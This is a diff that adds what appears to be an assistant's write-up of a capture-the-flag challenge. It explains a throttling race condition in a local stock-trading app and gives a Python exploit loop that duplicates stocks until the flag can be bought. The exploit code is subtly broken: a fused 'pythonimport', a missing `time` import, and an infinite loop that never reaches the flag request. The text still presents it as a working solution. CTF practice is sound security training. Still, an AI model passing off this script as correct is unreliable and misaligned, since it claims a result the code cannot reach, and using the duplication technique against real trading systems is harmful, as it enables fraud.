@@ -1,0 +1,52 @@
+
+Here are the steps to solve this challenge and get the flag:
+
+Analyze the app:
+
+
+There is a race condition due to restoring state from a backup when throttling occurs
+This causes any transactions made right before throttling to be reversed
+However, traded stocks are handled separately and trades are not reversed
+We can leverage this to duplicate stocks
+
+
+Strategy:
+
+
+Make buy transactions right before throttling to get stocks
+Trade them immediately after for different stocks
+When throttling restores state, we keep the new stocks from trades but get refund for the original buy
+Repeating this duplicates our stocks with no additional money spent
+Once we have enough value, buy the flag
+
+
+Script logic:
+
+pythonimport requests
+
+url = "http://127.0.0.1:4657"
+key = "mykey"  
+
+def buy(stock):
+    requests.post(url + "/buy", {"key":key, "stock":stock})
+
+def trade(stock1, stock2):
+    requests.post(url + "/trade", {"key":key, "stock":stock1, "stock1":stock2}) 
+
+while True:
+    # Buy stocks before throttling
+    buy("AAPLISH")  
+    buy("GOOBER")
+
+    # Trade them immediately 
+    trade("AAPLISH", "SNAPSTAR")  
+    trade("GOOBER", "FACEFLOP")
+
+    # Wait for throttling to restore state    
+    time.sleep(11) 
+
+# Now buy the flag
+requests.post(url + "/flag", {"key": key})  
+print(requests.post(url + "/login", {"key":key}).text)
+This duplicates stocks each cycle by leveraging the race condition, until we can afford the flag. The full solved script implements robustness like checking account balance, retrying on failures, etc.
+Let me know if you have any other questions!
